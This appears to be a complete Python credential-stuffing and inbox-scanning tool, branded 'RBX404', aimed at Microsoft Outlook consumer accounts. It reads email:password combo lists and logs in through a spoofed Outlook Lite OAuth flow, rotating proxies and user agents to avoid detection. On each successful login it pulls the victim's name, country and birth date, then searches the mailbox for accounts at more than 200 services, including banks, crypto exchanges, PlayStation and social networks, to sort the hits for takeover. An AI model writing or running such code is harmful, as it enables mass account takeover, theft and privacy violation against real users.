"""
RBX404 Inbox Engine — 200+ Service Detection
Supports proxy rotation via proxies_list parameter.
Falls back to direct connection if no proxies available.
"""
import re
import json
import uuid
import time
import random
import threading
import urllib.parse
import requests
from typing import Dict, List, Optional, Tuple

MY_SIGNATURE = "RBX404"

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

_UA_LIST = [
    "Outlook-Android/2.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

def _get_ua() -> str:
    return random.choice(_UA_LIST)


# ─── Service Dictionary (200+ services) ──────────────────────────────────────

SERVICES_ALL = {
    # ═══ SOCIAL MEDIA ═══
    "Facebook": ["facebookmail.com", "facebook.com"],
    "Instagram": ["mail.instagram.com", "instagram.com"],
    "TikTok": ["account.tiktok.com", "tiktok.com"],
    "Twitter/X": ["x.com", "twitter.com"],
    "LinkedIn": ["linkedin.com"],
    "Snapchat": ["snapchat.com"],
    "Discord": ["discord.com"],
    "Telegram": ["telegram.org"],
    "WhatsApp": ["whatsapp.com"],
    "Pinterest": ["pinterest.com"],
    "Reddit": ["reddit.com"],
    "Tumblr": ["tumblr.com"],
    "WeChat": ["wechat.com"],
    "Line": ["line.me"],
    "Viber": ["viber.com"],
    "Kik": ["kik.com"],
    "Skype": ["skype.com"],
    "Zoom": ["zoom.us"],
    "Microsoft Teams": ["teams.microsoft.com"],
    "Slack": ["slack.com"],
    "Mastodon": ["mastodon.social"],
    "Threads": ["threads.net"],
    "BeReal": ["bereal.com"],
    "Clubhouse": ["clubhouse.com"],
    "Twitch": ["twitch.tv"],
    "YouTube": ["youtube.com"],
    "Vimeo": ["vimeo.com"],
    "Dailymotion": ["dailymotion.com"],
    "Quora": ["quora.com"],
    "Medium": ["medium.com"],
    "Substack": ["substack.com"],
    "Patreon": ["patreon.com"],
    "Ko-fi": ["ko-fi.com"],
    "OnlyFans": ["onlyfans.com"],
    "Fanhouse": ["fanhouse.app"],
    "Meetup": ["meetup.com"],
    "Nextdoor": ["nextdoor.com"],
    "Yelp": ["yelp.com"],
    "9GAG": ["9gag.com"],
    # ═══ GAMING ═══
    "Steam": ["steampowered.com", "steam.com"],
    "Xbox": ["xbox.com"],
    "PlayStation": ["playstation.com"],
    "Nintendo": ["nintendo.net"],
    "Epic Games": ["epicgames.com"],
    "EA Sports": ["ea.com"],
    "Ubisoft": ["ubisoft.com"],
    "Activision": ["activision.com"],
    "Blizzard": ["blizzard.com"],
    "Riot Games": ["riotgames.com"],
    "Roblox": ["roblox.com"],
    "Minecraft": ["mojang.com", "minecraft.net"],
    "Fortnite": ["epicgames.com"],
    "Valorant": ["riotgames.com"],
    "League of Legends": ["leagueoflegends.com"],
    "Apex Legends": ["ea.com"],
    "Call of Duty": ["callofduty.com"],
    "PUBG": ["pubg.com", "pubgmobile.com"],
    "Free Fire": ["freefire.com", "garena.com"],
    "Genshin Impact": ["hoyoverse.com", "genshinimpact.com"],
    "Honkai Star Rail": ["hoyoverse.com"],
    "Mobile Legends": ["moonton.com"],
    "Clash of Clans": ["clashofclans.com"],
    "Clash Royale": ["clashroyale.com"],
    "Brawl Stars": ["brawlstars.com"],
    "Among Us": ["innersloth.com"],
    "Fall Guys": ["epicgames.com"],
    "Rocket League": ["epicgames.com"],
    "FIFA": ["ea.com"],
    "Madden NFL": ["ea.com"],
    "NBA 2K": ["2k.com"],
    "GTA V": ["rockstargames.com"],
    "Red Dead": ["rockstargames.com"],
    "The Sims": ["ea.com"],
    "Battlefield": ["ea.com"],
    "Overwatch": ["blizzard.com"],
    "World of Warcraft": ["blizzard.com"],
    "Hearthstone": ["blizzard.com"],
    "Diablo": ["blizzard.com"],
    "Destiny": ["bungie.net"],
    "Halo": ["xbox.com"],
    "Counter-Strike": ["steampowered.com"],
    "Dota 2": ["steampowered.com"],
    "Rainbow Six": ["ubisoft.com"],
    "Assassin's Creed": ["ubisoft.com"],
    "Far Cry": ["ubisoft.com"],
    "Watch Dogs": ["ubisoft.com"],
    "Warframe": ["warframe.com"],
    "Paladins": ["hirezstudios.com"],
    "Smite": ["hirezstudios.com"],
    "War Thunder": ["gaijin.net"],
    "World of Tanks": ["wargaming.net"],
    "Crossfire": ["z8games.com"],
    "Garena": ["garena.com"],
    "Cookie Run": ["devsisters.com"],
    "Candy Crush": ["king.com"],
    "Pokemon GO": ["nianticlabs.com"],
    "RAID Shadow": ["plarium.com"],
    "AFK Arena": ["lilithgames.com"],
    "Supercell": ["supercell.com"],
    "Midasbuy": ["midasbuy.com"],
    # ═══ STREAMING ═══
    "Netflix": ["account.netflix.com", "netflix.com"],
    "Spotify": ["spotify.com"],
    "Disney+": ["disneyplus.com"],
    "HBO Max": ["hbomax.com"],
    "Amazon Prime": ["primevideo.com"],
    "YouTube Premium": ["youtube.com"],
    "Apple TV+": ["apple.com"],
    "Apple Music": ["apple.com"],
    "Hulu": ["hulu.com"],
    "Paramount+": ["paramountplus.com"],
    "Peacock": ["peacocktv.com"],
    "Discovery+": ["discoveryplus.com"],
    "Crunchyroll": ["crunchyroll.com"],
    "Funimation": ["funimation.com"],
    "VRV": ["vrv.co"],
    "Tidal": ["tidal.com"],
    "Deezer": ["deezer.com"],
    "SoundCloud": ["soundcloud.com"],
    "Pandora": ["pandora.com"],
    "iHeartRadio": ["iheart.com"],
    "Audible": ["audible.com"],
    "Scribd": ["scribd.com"],
    "ESPN+": ["espn.com"],
    "DAZN": ["dazn.com"],
    "Showtime": ["showtime.com"],
    "Starz": ["starz.com"],
    "Pluto TV": ["pluto.tv"],
    "Tubi": ["tubi.tv"],
    "Vudu": ["vudu.com"],
    "Plex": ["plex.tv"],
    # ═══ SHOPPING ═══
    "Amazon": ["amazon.com"],
    "eBay": ["ebay.com"],
    "AliExpress": ["aliexpress.com"],
    "Walmart": ["walmart.com"],
    "Target": ["target.com"],
    "Best Buy": ["bestbuy.com"],
    "Newegg": ["newegg.com"],
    "Etsy": ["etsy.com"],
    "Wish": ["wish.com"],
    "Shein": ["shein.com"],
    "Temu": ["temu.com"],
    "Shopee": ["shopee.com"],
    "Lazada": ["lazada.com"],
    "Zalando": ["zalando.com"],
    "ASOS": ["asos.com"],
    "Nike": ["nike.com"],
    "Adidas": ["adidas.com"],
    "Zara": ["zara.com"],
    "H&M": ["hm.com"],
    "Uniqlo": ["uniqlo.com"],
    "Forever 21": ["forever21.com"],
    "Gap": ["gap.com"],
    "Old Navy": ["oldnavy.com"],
    "Macy's": ["macys.com"],
    "Nordstrom": ["nordstrom.com"],
    "Sephora": ["sephora.com"],
    "Ulta": ["ulta.com"],
    "IKEA": ["ikea.com"],
    "Wayfair": ["wayfair.com"],
    "Overstock": ["overstock.com"],
    "Zappos": ["zappos.com"],
    "StockX": ["stockx.com"],
    "GOAT": ["goat.com"],
    "Farfetch": ["farfetch.com"],
    "Depop": ["depop.com"],
    "Poshmark": ["poshmark.com"],
    "Mercari": ["mercari.com"],
    # ═══ FINANCE & CRYPTO ═══
    "PayPal": ["paypal.com"],
    "Venmo": ["venmo.com"],
    "Cash App": ["cash.app"],
    "Zelle": ["zellepay.com"],
    "Stripe": ["stripe.com"],
    "Square": ["square.com"],
    "Binance": ["binance.com"],
    "Coinbase": ["coinbase.com"],
    "Kraken": ["kraken.com"],
    "Crypto.com": ["crypto.com"],
    "KuCoin": ["kucoin.com"],
    "Bitfinex": ["bitfinex.com"],
    "Gemini": ["gemini.com"],
    "Bitstamp": ["bitstamp.net"],
    "OKX": ["okx.com"],
    "Bybit": ["bybit.com"],
    "Huobi": ["huobi.com"],
    "Revolut": ["revolut.com"],
    "Wise": ["wise.com"],
    "Skrill": ["skrill.com"],
    "Neteller": ["neteller.com"],
    "Payoneer": ["payoneer.com"],
    "WebMoney": ["webmoney.ru"],
    "Robinhood": ["robinhood.com"],
    "eToro": ["etoro.com"],
    "Fidelity": ["fidelity.com"],
    "Charles Schwab": ["schwab.com"],
    "Interactive Brokers": ["ibkr.com"],
    # ═══ AI PLATFORMS ═══
    "ChatGPT": ["openai.com"],
    "Claude AI": ["anthropic.com"],
    "Google Gemini": ["google.com"],
    "Microsoft Copilot": ["microsoft.com"],
    "Grok": ["x.ai"],
    "Perplexity AI": ["perplexity.ai"],
    "DeepSeek": ["deepseek.com"],
    "Poe": ["poe.com"],
    "Character.AI": ["character.ai"],
    "Replika": ["replika.ai"],
    "Jasper": ["jasper.ai"],
    "Copy.ai": ["copy.ai"],
    "Grammarly": ["grammarly.com"],
    "QuillBot": ["quillbot.com"],
    "Midjourney": ["midjourney.com"],
    "Stable Diffusion": ["stability.ai"],
    "ElevenLabs": ["elevenlabs.io"],
    # ═══ EDUCATION ═══
    "Udemy": ["udemy.com"],
    "Coursera": ["coursera.org"],
    "edX": ["edx.org"],
    "Khan Academy": ["khanacademy.org"],
    "Skillshare": ["skillshare.com"],
    "LinkedIn Learning": ["linkedin.com"],
    "Pluralsight": ["pluralsight.com"],
    "DataCamp": ["datacamp.com"],
    "Codecademy": ["codecademy.com"],
    "Duolingo": ["duolingo.com"],
    "Babbel": ["babbel.com"],
    "Rosetta Stone": ["rosettastone.com"],
    "Memrise": ["memrise.com"],
    "Brilliant": ["brilliant.org"],
    "MasterClass": ["masterclass.com"],
    "Domestika": ["domestika.org"],
    "Udacity": ["udacity.com"],
    "FutureLearn": ["futurelearn.com"],
    # ═══ PROXY SERVICES ═══
    "OxyLabs": ["oxylabs.io"],
    "Bright Data": ["brightdata.com"],
    "SmartProxy": ["smartproxy.com"],
    "IPRoyal": ["iproyal.com"],
    "ProxyEmpire": ["proxyempire.io"],
    "LunaProxy": ["lunaproxy.com"],
    "Flamingo Proxies": ["flamingoproxies.com"],
}

# Service → folder mapping
_GAMES = {
    'Steam', 'Xbox', 'PlayStation', 'Nintendo', 'Epic Games', 'EA Sports', 'Ubisoft',
    'Activision', 'Blizzard', 'Riot Games', 'Roblox', 'Minecraft', 'Fortnite', 'Valorant',
    'League of Legends', 'Apex Legends', 'Call of Duty', 'PUBG', 'Free Fire', 'Genshin Impact',
    'Honkai Star Rail', 'Mobile Legends', 'Clash of Clans', 'Clash Royale', 'Brawl Stars',
    'Among Us', 'Fall Guys', 'Rocket League', 'FIFA', 'Madden NFL', 'NBA 2K', 'GTA V',
    'Red Dead', 'The Sims', 'Battlefield', 'Overwatch', 'World of Warcraft', 'Hearthstone',
    'Diablo', 'Destiny', 'Halo', 'Counter-Strike', 'Dota 2', 'Rainbow Six', "Assassin's Creed",
    'Far Cry', 'Watch Dogs', 'Warframe', 'Paladins', 'Smite', 'War Thunder', 'World of Tanks',
    'Crossfire', 'Garena', 'Cookie Run', 'Candy Crush', 'Pokemon GO', 'RAID Shadow', 'AFK Arena',
    'Supercell', 'Midasbuy',
}

_SOCIAL = {
    'Facebook', 'Instagram', 'TikTok', 'Twitter/X', 'Snapchat', 'LinkedIn', 'Pinterest',
    'Reddit', 'Discord', 'Telegram', 'WhatsApp', 'WeChat', 'Line', 'Viber', 'Kik',
    'Skype', 'Mastodon', 'Threads', 'BeReal', 'Clubhouse', 'Twitch', 'YouTube',
    'Quora', 'Medium', 'Substack', 'Patreon', 'Ko-fi', 'OnlyFans', 'Fanhouse',
    'Meetup', 'Yelp', '9GAG',
}

_PAYMENT = {
    'PayPal', 'Venmo', 'Cash App', 'Zelle', 'Stripe', 'Square', 'Binance', 'Coinbase',
    'Kraken', 'Crypto.com', 'KuCoin', 'Bitfinex', 'Gemini', 'Bitstamp', 'OKX', 'Bybit',
    'Huobi', 'Revolut', 'Wise', 'Skrill', 'Neteller', 'Payoneer', 'WebMoney',
    'Robinhood', 'eToro', 'Fidelity', 'Charles Schwab', 'Interactive Brokers',
}

_PROXY_SVC = {
    'OxyLabs', 'Bright Data', 'SmartProxy', 'IPRoyal', 'ProxyEmpire', 'LunaProxy', 'Flamingo Proxies',
}

_SOCIAL_LINK_PLATFORMS = {'TikTok', 'Instagram', 'Facebook', 'Twitter/X'}

_SOCIAL_LINK_TMPL = {
    "TikTok":    "https://www.tiktok.com/@{u}",
    "Instagram": "https://www.instagram.com/{u}/",
    "Facebook":  "https://www.facebook.com/{u}",
    "Twitter/X": "https://twitter.com/{u}",
}


def _service_folder(svc: str) -> str:
    if svc in _GAMES:
        return "Games"
    if svc in _SOCIAL:
        return "Social"
    if svc in _PAYMENT:
        return "Payment"
    if svc in _PROXY_SVC:
        return "Proxy"
    return "Apps"


# ─── Profile Fetcher (direct — no proxy) ─────────────────────────────────────

def _get_profile(token: str, cid: str) -> dict:
    default = {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                         headers=headers, timeout=10)
        if r.status_code != 200:
            r = requests.get("https://substrate.office.com/users/v2.0/me",
                             headers=headers, timeout=8)
        if r.status_code != 200:
            return default
        d = r.json()

        name = "Unknown"
        if 'names' in d and d['names']:
            name = d['names'][0].get('displayName', 'Unknown')
        if name == 'Unknown':
            name = d.get('displayName', d.get('userPrincipalName', 'Unknown'))
            if name and '@' in name:
                name = name.split('@')[0]
        if name == 'Unknown' and 'givenName' in d and 'surname' in d:
            name = f"{d['givenName']} {d['surname']}".strip() or 'Unknown'

        country = "Unknown"
        if 'accounts' in d and d['accounts']:
            country = d['accounts'][0].get('location', 'Unknown')
        if country == 'Unknown':
            country = d.get('country', 'Unknown')

        birth_date = "Unknown"
        try:
            js = json.dumps(d)
            day = re.search(r'"birthDay"\s*:\s*"?(\d{1,2})"?', js)
            mon = re.search(r'"birthMonth"\s*:\s*"?(\d{1,2})"?', js)
            yr = re.search(r'"birthYear"\s*:\s*"?(\d{4})"?', js)
            if day and mon and yr:
                birth_date = f"{day.group(1).zfill(2)}/{mon.group(1).zfill(2)}/{yr.group(1)}"
            elif yr:
                birth_date = yr.group(1)
        except:
            pass

        return {'name': name, 'country': country, 'birth_date': birth_date}
    except:
        return default


# ─── General Scan (direct — no proxy) ────────────────────────────────────────

def _general_scan(email: str, token: str, cid: str) -> Tuple[List[str], str]:
    try:
        url_owa = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers_owa = {
            "x-owa-sessionid": cid,
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)",
            "action": "StartupData",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
        }
        r = requests.post(url_owa, headers=headers_owa, data="")
        content = r.text.lower()

        found = []
        seen = set()
        for svc, domains in SERVICES_ALL.items():
            for d in domains:
                dl = d.lower()
                if dl not in content:
                    continue
                confirmed = (
                    f"@{dl}" in content or
                    f"noreply@{dl}" in content or
                    f"no-reply@{dl}" in content or
                    f"{dl}/" in content or
                    f"www.{dl}" in content
                )
                if not confirmed and svc in ["Facebook", "Instagram", "TikTok", "Twitter/X"]:
                    confirmed = dl in content and ("@" in content or "noreply" in content)
                if confirmed and svc not in seen:
                    seen.add(svc)
                    found.append(svc)
                    break
        return found, content
    except:
        return [], ""


# ─── PSN Detailed Scan (direct — no proxy) ───────────────────────────────────

def _psn_scan(token: str, cid: str) -> dict:
    empty = {"has_psn": False, "orders": 0, "online_ids": [], "psn_emails_count": 0}
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }
        payload = {
            "Cvid": str(uuid.uuid4()),
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": "sony@txn-email.playstation.com"},
                "Size": 50,
            }],
        }
        r = requests.post(search_url, json=payload, headers=headers, timeout=15)
        if r.status_code != 200:
            return empty
        txt = json.dumps(r.json())
        psn_domains = ["sony@txn-email.playstation.com", "Sony@email.sonyentertainmentnetwork.com"]
        count = sum(txt.lower().count(d.lower()) for d in psn_domains)
        if count == 0:
            return empty

        # Store orders
        payload_store = {
            "Cvid": str(uuid.uuid4()),
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": "PlayStation®Store OR PlayStation™Store"},
                "Size": 25,
            }],
        }
        store_count = 0
        try:
            rs = requests.post(search_url, json=payload_store, headers=headers, timeout=10)
            if rs.status_code == 200:
                st = json.dumps(rs.json())
                store_count = st.count("PlayStation\u00aeStore") + st.count("PlayStation\u2122Store")
        except:
            pass
        orders_count = store_count // 2 if store_count > 0 else 0

        # Online IDs
        patterns = [
            r'(?i)(?:Hello|Hi|Welcome back)[\s,]+["\']?([a-zA-Z0-9_-]{3,20})["\']?',
            r'(?i)Signed in as[\s:]+([a-zA-Z0-9_-]{3,20})',
            r'(?i)(?:psn[\s_-]*id|online[\s_-]*id)[\s:]*["\']?([a-zA-Z0-9_-]{3,20})["\']?',
            r'(?i)playing as[\s:]*["\']?([a-zA-Z0-9_-]{3,20})["\']?',
        ]
        oids = []
        for pat in patterns:
            for m in re.findall(pat, txt):
                m = m.strip().strip('"').strip("'")
                if 3 <= len(m) <= 20 and m not in oids:
                    oids.append(m)
        return {
            "has_psn": True,
            "orders": orders_count,
            "online_ids": list(set(oids))[:3],
            "psn_emails_count": count,
        }
    except:
        return empty


# ─── Username / Link Helpers ──────────────────────────────────────────────────

def _extract_username_from_email(email: str) -> Optional[str]:
    try:
        u = email.split('@')[0].lower()
        u = re.sub(r'[^a-zA-Z0-9_.]', '', u)
        return u if 3 <= len(u) <= 30 else None
    except:
        return None


def _extract_username_from_content(content: str, platform: str) -> Optional[str]:
    patterns = {
        "TikTok":    [r'tiktok\.com/@([a-zA-Z0-9_.]{3,30})', r'@([a-zA-Z0-9_.]{3,30})\s'],
        "Instagram": [r'instagram\.com/([a-zA-Z0-9_.]{3,30})', r'@([a-zA-Z0-9_.]{3,30})\s'],
        "Facebook":  [r'facebook\.com/([a-zA-Z0-9.]{3,50})'],
        "Twitter/X": [r'twitter\.com/([a-zA-Z0-9_]{3,30})', r'x\.com/([a-zA-Z0-9_]{3,30})'],
    }
    for pat in patterns.get(platform, []):
        for m in re.findall(pat, content, re.IGNORECASE):
            m = m.strip()
            if 3 <= len(m) <= 30 and not any(x in m.lower() for x in ['email', 'mail', 'account', 'support']):
                return m
    return None


# ─── Main check (direct — no proxy) ──────────────────────────────────────────

_proxy_cycle_lock = threading.Lock()
_proxy_cycle_idx  = 0


def _pick_proxy(proxies_list: Optional[List[str]]) -> Optional[dict]:
    """Round-robin pick a proxy dict from the list, or None for direct."""
    global _proxy_cycle_idx
    if not proxies_list:
        return None
    with _proxy_cycle_lock:
        p = proxies_list[_proxy_cycle_idx % len(proxies_list)]
        _proxy_cycle_idx += 1
    try:
        parts = p.strip().split(":")
        if len(parts) == 4:
            h, po, u, pw = parts
            url = f"http://{u}:{pw}@{h}:{po}"
            return {"http": url, "https": url}
        if "@" in p:
            url = f"http://{p}" if not p.startswith("http") else p
            return {"http": url, "https": url}
        if len(parts) == 2:
            url = f"http://{p}"
            return {"http": url, "https": url}
    except:
        pass
    return None


def check_inbox_account(email: str, password: str, proxies_list: List[str] = None) -> dict:
    """
    Returns {
        status: 'hit'|'bad'|'error',
        email, password, retries,
        profile: {name, country, birth_date},
        services: [str, ...],
        folder_map: {Games:[], Social:[], Apps:[], Payment:[], Proxy:[], PSN:[]},
        social_links: {TikTok:{username, link}, ...},
        psn_details: {...},
        info_line: str,
    }
    Uses proxy from proxies_list if provided, otherwise direct connection.
    """
    retries = 0
    for attempt in range(3):
        # Pick proxy for this attempt (rotate per attempt)
        proxy = _pick_proxy(proxies_list) if proxies_list else None
        proxy_kwargs = {"proxies": proxy} if proxy else {}
        try:
            ua = _get_ua()
            params = {
                "client_info": "1", "haschrome": "1", "login_hint": email, "mkt": "en",
                "response_type": "code", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            }
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"

            res_auth = requests.get(
                url_auth,
                headers={"User-Agent": ua, "X-Requested-With": "com.microsoft.outlooklite"},
                timeout=10,
                **proxy_kwargs,
            )
            cok = res_auth.cookies.get_dict()

            host = res_auth.text.split('"urlPost":"')[1].split('",')[0]
            ppft = res_auth.text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
            ad_url = res_auth.url.split('haschrome=1')[0]

            payload = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "PPFT": ppft,
                "PPSX": "PassportR", "i19": "9960",
            }
            # Cookie format exactly matches working example (spaces after ; for some cookies)
            headers_login = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ua,
                "Referer": f"{ad_url}haschrome=1",
                "Cookie": f"MSPRequ={cok.get('MSPRequ')};uaid={cok.get('uaid')}; RefreshTokenSso={cok.get('RefreshTokenSso')}; MSPOK={cok.get('MSPOK')}; OParams={cok.get('OParams')};",
            }
            res_login = requests.post(
                host, data=payload, headers=headers_login,
                allow_redirects=False, timeout=10,
                **proxy_kwargs,
            )
            login_cookies = res_login.cookies.get_dict()

            if not any(k in login_cookies for k in ["JSH", "JSHP", "ANON", "WLSSC"]):
                return {"status": "bad", "email": email, "password": password, "retries": retries}

            # ── HIT — get token and scan inbox ──
            try:
                auth_code = res_login.headers.get('Location', '').split('code=')[1].split('&')[0]
            except:
                return {"status": "bad", "email": email, "password": password, "retries": retries}

            cid = login_cookies.get('MSPCID', str(uuid.uuid4())).upper()

            token_res = requests.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data={
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                    "grant_type": "authorization_code",
                    "code": auth_code,
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                },
                **proxy_kwargs,
            ).json()
            token = token_res.get("access_token")
            if not token:
                return {"status": "error", "email": email, "password": password, "retries": retries}

            profile = _get_profile(token, cid)
            services, content = _general_scan(email, token, cid)

            # PSN detail
            psn_details = {}
            if 'PlayStation' in services:
                psn_details = _psn_scan(token, cid)

            # Social links
            social_links = {}
            for platform in _SOCIAL_LINK_PLATFORMS:
                if platform in services:
                    uname = _extract_username_from_content(content, platform)
                    if not uname:
                        uname = _extract_username_from_email(email)
                    if uname:
                        tmpl = _SOCIAL_LINK_TMPL.get(platform, "")
                        social_links[platform] = {
                            "username": uname,
                            "link": tmpl.format(u=uname),
                        }

            # Folder map
            folder_map: Dict[str, List[str]] = {
                "General": [], "Games": [], "Social": [], "Apps": [],
                "Payment": [], "Proxy": [], "PSN": [],
            }
            for svc in services:
                folder_map[_service_folder(svc)].append(svc)
            if psn_details.get("has_psn"):
                if "PlayStation" not in folder_map["PSN"]:
                    folder_map["PSN"].append("PlayStation")

            info_line = (
                f"𝗘𝗺𝗮𝗶𝗹: {email} | 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗗: {password} | "
                f"𝗡𝗮𝗺𝗲: {profile['name']} | 𝗰𝗼𝘂𝗻𝘁𝗿𝗲: {profile['country']} | "
                f"𝗕𝗶𝗿𝘁𝗗𝗮𝘁𝗲: {profile['birth_date']}"
            )

            return {
                "status": "hit",
                "email": email, "password": password, "retries": retries,
                "profile": profile,
                "services": services,
                "folder_map": folder_map,
                "social_links": social_links,
                "psn_details": psn_details,
                "info_line": info_line,
            }

        except Exception:
            retries += 1
            if attempt < 2:
                time.sleep(0.5)

    return {"status": "error", "email": email, "password": password, "retries": retries}


def parse_inbox_combos(lines: List[str]) -> Tuple[List[Tuple[str, str]], int, int]:
    combos = []
    bad = 0
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            bad += 1
            continue
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and '@' in parts[0] and parts[1].strip():
                combos.append((parts[0].strip(), parts[1].strip()))
            else:
                bad += 1
        else:
            bad += 1
    total = len(combos) + bad
    return combos, total, bad
